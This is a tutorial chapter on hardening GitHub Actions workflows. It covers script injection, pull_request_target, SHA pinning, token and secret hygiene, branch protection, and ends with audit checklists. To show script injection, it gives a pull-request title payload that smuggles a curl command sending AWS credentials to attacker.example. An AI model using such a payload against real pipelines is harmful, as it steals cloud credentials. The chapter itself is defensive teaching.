# 09 — Security hardening

CI runs with credentials. Treat a workflow file as production code.

## Script injection

The most-exploited vulnerability in GitHub Actions, and the least obvious.

```yaml
# VULNERABLE
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

`${{ }}` is substituted **before** the shell runs. The runner never sees an
expression — it sees whatever the substitution produced.

Open a pull request titled:

```
hello"; curl -d @$HOME/.aws/credentials https://attacker.example; echo "
```

and the executed line becomes:

```bash
echo "PR title: hello"; curl -d @$HOME/.aws/credentials https://attacker.example; echo ""
```

Arbitrary code, in your runner, with your credentials.

### The fix

Pass through the environment. The shell then sees a **variable**, never the
attacker's text:

```yaml
# SAFE
- run: echo "PR title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Quote the variable. Shell expansion of a variable's *contents* does not
re-parse metacharacters.

`arifa-infra` states this as a rule in the header:

> Pull request data (titles, branch names) is never interpolated into run: blocks.

and follows it even for a trusted matrix value:

```yaml
- name: terraform plan
  env:
    TF_ENV: ${{ matrix.env }}
  run: terraform -chdir="envs/$TF_ENV" plan -no-color -lock-timeout=5m
```

`matrix.env` is defined in the file and cannot be attacker-controlled. Using the
safe form anyway means the pattern is consistent, so a reviewer never has to
judge whether a particular interpolation is safe.

### Untrusted inputs

Anything a user can type:

```
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref        # branch name
github.event.issue.title / .body
github.event.comment.body
github.event.head_commit.message
github.event.review.body
github.actor                              # username
```

Branch names are the sneaky one — they allow a lot of punctuation.

### Detection

`actionlint` finds these automatically:

```bash
actionlint .github/workflows/*.yml
```

Worth running in pre-commit and in CI.

## `pull_request_target`

```yaml
# DANGEROUS
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

`pull_request_target` runs in the **base** repository context — with secrets and
a write token. Checking out the PR's code and running it hands full control to
anyone who can open a pull request. `npm ci` alone executes install scripts from
the fork.

**Rule: never check out or execute PR code under `pull_request_target`.** Use it
only for metadata work — labelling, commenting — on the base checkout.

If you need to test fork code, use `pull_request`, which gets no secrets.

## Supply chain

Covered in chapter 05; the essentials:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

**Pin to a commit SHA.** Tags move; SHAs do not.

**Verify downloads:**

```yaml
curl -fsSLo tflint.zip "https://github.com/.../tflint_linux_amd64.zip"
echo "${TFLINT_SHA256}  tflint.zip" | sha256sum --check --strict
```

**Restrict which actions may run** — Settings → Actions → General: GitHub-owned
only, or GitHub plus verified creators, or an explicit allowlist.

`arifa-infra` operates under exactly that policy and documents the consequence:

> Only GitHub-owned and verified-creator actions run. tflint and trivy have no
> allowed action, so they are installed from pinned release archives with a
> committed sha256. trivy-action is not used on purpose: its tags were hijacked
> in March 2026 (GHSA-69fq-xp46-6x23).

## Token hygiene

```yaml
permissions:
  contents: read                 # restrictive default
```

```yaml
- uses: actions/checkout@<sha>
  with:
    persist-credentials: false   # no token left in .git/config
```

Without the second, any later step — including a compromised transitive
dependency — can read the token from the checkout and push to your repository.

## Secrets

- Never `echo` a secret, or transform one (`base64`, `rev`) — transforms defeat
  masking
- Never `env | sort` or dump `toJSON(secrets)`
- Pass secrets only to the step that needs them
- Use `vars` for anything non-sensitive, so `secrets` stays short and meaningful
- Rotate anything that may have been exposed; deleting the line does not retract
  the log

> Contrast with `main/.gitlab-ci.yml` in this workspace, which contains
> `echo "token ${PERSONAL_TOKEN}"`. GitHub's explicit `secrets.` namespace makes
> that kind of line stand out in review; GitLab's does not. See
> [the GitLab guide, chapter 10](../gitlab-ci-guide/10-secrets-and-security.md).

## Branch protection

Whoever can modify a workflow can exfiltrate every secret it can reach. So:

- Require pull requests to the default branch
- Require review, with CODEOWNERS on `.github/workflows/**`
- Require status checks to pass
- Disallow force pushes

```
# CODEOWNERS
.github/workflows/  @org/platform-team
```

## Third-party code in general

The danger is not only `uses:`. `npm ci`, `pip install`, `go get` all execute
third-party code with your token.

- Commit lockfiles and install from them (`npm ci`, not `npm install`)
- Prefer `--frozen-lockfile` equivalents
- Run dependency installs in jobs with minimal `permissions:`
- Consider a private registry proxy

## Self-hosted runners

```yaml
runs-on: rcn-ubuntu-amd64
```

Self-hosted runners do **not** reset between jobs unless configured to. A
malicious or buggy job can leave files, processes or cache poisoning behind.

> **Never use self-hosted runners on a public repository.** Anyone can open a
> PR, and by default that runs on your infrastructure.

For private repositories, prefer ephemeral runners or container-isolated ones.

## Concurrency and cancellation

```yaml
concurrency:
  group: terraform-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

Not primarily a security control, but it prevents a stale run from overwriting a
newer result.

> Be careful with `cancel-in-progress` on deployment workflows — cancelling
> mid-apply can leave infrastructure half-changed.

## Auditing a workflow

1. Every `uses:` pinned to a SHA?
2. Any `${{ }}` with user-controlled data inside a `run:`?
3. `permissions:` declared and minimal?
4. `persist-credentials: false` on checkouts?
5. `pull_request_target` used? If so, does it check out PR code?
6. Secrets passed only where needed, never printed?
7. OIDC rather than stored keys?
8. Self-hosted runners on a public repository?
9. Timeouts set?
10. Downloads checksum-verified?

## Checklist

**Injection**
- [ ] No untrusted `${{ }}` inside `run:`
- [ ] User data passed via `env:`
- [ ] `actionlint` in CI

**Supply chain**
- [ ] All actions SHA-pinned with version comments
- [ ] Dependabot updating them
- [ ] Downloads checksum-verified
- [ ] Organisation allowlist configured

**Tokens**
- [ ] `permissions: contents: read` at workflow level
- [ ] Elevation only where needed
- [ ] `persist-credentials: false`
- [ ] OIDC for cloud access

**Repository**
- [ ] Workflows under CODEOWNERS
- [ ] Branch protection on the default branch
- [ ] No self-hosted runners on public repos
- [ ] Fork PRs get no secrets

## Try it

In [`terraform.yml`](../arifa-infra/.github/workflows/terraform.yml):

1. Find every `${{ }}` inside or near a `run:`. Is any user-controllable?
2. Why does the plan step route `matrix.env` through `env:`?
3. Which hardening measures from the checklist does it already have?
4. Which two does it lack? (Hint: one is a file that does not exist; one is a
   trigger.)
5. Rewrite this safely:

```yaml
- run: echo "Branch ${{ github.event.pull_request.head.ref }}"
```

## Check yourself

1. Why is `${{ }}` inside `run:` dangerous?
2. Why does `env:` indirection fix it?
3. What makes `pull_request_target` risky?
4. Why pin to a SHA rather than a tag?
5. What does `persist-credentials: false` prevent?
6. Why never use self-hosted runners on a public repository?
7. A secret was printed to a log. First action?

---

Previous: [08 — Permissions and OIDC](08-permissions-and-oidc.md) ·
Next: [10 — Matrix and concurrency](10-matrix-and-concurrency.md)
